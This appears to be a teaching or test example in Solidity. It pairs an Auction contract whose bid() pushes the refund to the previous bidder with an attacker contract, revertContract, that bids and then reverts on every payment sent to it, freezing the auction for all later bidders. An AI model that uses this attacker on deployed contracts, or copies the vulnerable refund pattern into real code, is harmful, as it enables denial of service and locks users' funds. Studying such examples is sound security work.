pragma solidity ^0.4.24;


contract Auction {
    address public topBidder;
    uint256 public topBid;

    constructor() public payable {
        require(msg.value > 0);      
        topBid = msg.value;
        topBidder = msg.sender;
    }
    
    function bid() payable {
        require(msg.value > topBid);
        topBidder.transfer(topBid);

        topBidder = msg.sender;
        topBid = msg.value;

    }

    // finish the auction
    function auction_end() {
        // ...
    }
    
}

contract revertContract{
    
    function testBid(address _addr) public payable{
        bytes4 methodHash = bytes4(keccak256("bid()"));
        _addr.call.value(msg.value)(methodHash);
    }
    
    function ownedEth() public constant returns(uint256){
        return this.balance;
    }
    
    function() public payable{
        revert();
    }
}